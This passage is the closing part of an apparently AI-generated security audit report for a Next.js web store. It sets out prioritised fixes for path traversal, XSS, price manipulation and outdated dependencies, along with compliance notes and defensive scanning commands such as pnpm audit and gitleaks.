   - Add strict validation to `getConfig()` and `saveConfig()`
   - Implement path containment checks
   - Estimated effort: 30 minutes

2. **Update Next.js to v15.1.4** [CRITICAL-03, HIGH-02, HIGH-03, HIGH-04, HIGH-05]
   - Resolves 8 known CVEs
   - Estimated effort: 15 minutes + testing

3. **Implement Input Validation in Cart** [CRITICAL-02]
   - Add server-side price validation
   - Sanitize all user inputs
   - Estimated effort: 2 hours

4. **Sanitize Config Data for XSS** [HIGH-01]
   - Install DOMPurify
   - Sanitize all text fields from config
   - Estimated effort: 1 hour

5. **Replace Mock Payment Form** [HIGH-02]
   - Remove current credit card inputs
   - Plan Stripe integration (or remove payment flow entirely if not needed)
   - Estimated effort: 4 hours (if implementing real payments)

### Short-Term Improvements (Medium Priority)

6. **Add Security Headers** [MEDIUM-07]
   - Configure CSP, X-Frame-Options, etc.
   - Estimated effort: 30 minutes

7. **Implement CSRF Protection** [MEDIUM-01]
   - Add CSRF tokens to forms
   - Estimated effort: 1 hour

8. **Add Image URL Validation** [MEDIUM-04]
   - Whitelist image domains
   - Estimated effort: 20 minutes

9. **Protect saveConfig Access** [MEDIUM-05]
   - Do not expose via public API
   - Estimated effort: 10 minutes (documentation/review)

10. **Add Rate Limiting** [MEDIUM-08]
    - Implement basic rate limiting on forms
    - Estimated effort: 1 hour

### Long-Term Hardening (Low Priority)

11. **Improve Error Handling** [LOW-01]
    - Sanitize error messages sent to client
    - Estimated effort: 30 minutes

12. **Add Comprehensive Security Testing**
    - Automated SAST/DAST scans in CI/CD
    - Penetration testing before production launch
    - Estimated effort: 4 hours setup

13. **Implement Security Monitoring**
    - Log suspicious activities (path traversal attempts, rate limit violations)
    - Set up alerts for anomalies
    - Estimated effort: 2 hours

---

## Trend Analysis

**Baseline Scan**: This is the first security scan of the store implementation.

**Observations**:
- The store code was added without security review
- Multiple critical vulnerabilities introduced in one commit
- No input validation or sanitization implemented
- Relying on outdated Next.js version with known CVEs

**Trend**: N/A (first scan)
**Future Recommendation**: Implement security scanning in CI/CD pipeline to catch vulnerabilities before merge.

---

## Overall Security Posture Assessment

**Current Risk Level**: **HIGH**

The store implementation introduces several critical and high-severity vulnerabilities that must be addressed before production deployment. The most concerning issues are:

1. **Path Traversal** - Direct risk of arbitrary file access
2. **Price Manipulation** - Business logic bypass allowing free purchases
3. **XSS Vulnerabilities** - Multiple injection points for malicious scripts
4. **Outdated Dependencies** - 8 known CVEs in Next.js

**Success Criteria**: NOT MET
**Deployment Recommendation**: **BLOCK** - Do not deploy to production until Critical and High severity issues are resolved.

**Estimated Remediation Time**: 8-10 hours for all Critical/High issues

**Priority Order**:
1. Update Next.js (15 min)
2. Fix path traversal (30 min)
3. Add input validation (2 hours)
4. Implement XSS sanitization (1 hour)
5. Address payment security (4 hours if implementing real payments, or 10 min to remove mock)

---

## Compliance Notes

**PCI-DSS**: NOT COMPLIANT - Current payment form would violate PCI-DSS if implemented. Must use tokenization (Stripe Elements) or hosted checkout page.

**GDPR**: Partial - No user data collection yet, but future implementations must ensure:
- Explicit consent for newsletter subscriptions
- Privacy policy
- Right to data deletion

**OWASP Top 10 Coverage**:
- A01:2021 – Broken Access Control ✅ (Path traversal, unprotected config writes)
- A02:2021 – Cryptographic Failures ✅ (Payment data handling)
- A03:2021 – Injection ✅ (XSS vulnerabilities)
- A05:2021 – Security Misconfiguration ✅ (Missing headers, outdated deps)
- A06:2021 – Vulnerable Components ✅ (Next.js CVEs)

---

## Security Testing Recommendations

### Automated Testing (Integrate into CI/CD)

1. **SAST (Static Application Security Testing)**:
```bash
# Install and run ESLint security plugins
pnpm add -D eslint-plugin-security eslint-plugin-no-unsanitized

# Add to .eslintrc.json
{
  "extends": ["plugin:security/recommended"],
  "plugins": ["security", "no-unsanitized"]
}
```

2. **Dependency Scanning**:
```bash
# Run on every commit
pnpm audit
pnpm audit --audit-level=high # Fail CI on high/critical

# Or use Snyk
npx snyk test
```

3. **Secret Scanning**:
```bash
# Install gitleaks
brew install gitleaks

# Scan for secrets
gitleaks detect --source . --verbose
```

### Manual Testing (Before Production)

1. **Penetration Testing Checklist**:
   - [ ] Test path traversal with various payloads
   - [ ] Attempt XSS injection in all text fields
   - [ ] Manipulate cart prices via browser console
   - [ ] Test CSRF attacks on forms
   - [ ] Attempt SQL injection (if database added)
   - [ ] Test rate limiting bypasses
   - [ ] Verify security headers with securityheaders.com
   - [ ] Test for clickjacking vulnerabilities

2. **Security Code Review**:
   - [ ] Review all data flows from user input to output
   - [ ] Verify all file system operations are protected
   - [ ] Ensure no secrets in source code or environment variables
   - [ ] Check all external dependencies are actively maintained

---

## Contact & Escalation

**For Critical Issues**: Immediately notify development lead and security team.

**Security Contact**: [security@example.com] (replace with actual contact)

**Escalation Path**:
1. Development Team → Fix critical issues within 24 hours
2. Security Team → Review and validate fixes
3. Management → Approve production deployment only after all Critical/High issues resolved

---

**Report Generated By**: Security Scanner (Claude Code)
**Next Scan Recommended**: After remediation of Critical/High issues
**Automated Scanning**: Recommended to integrate into CI/CD pipeline

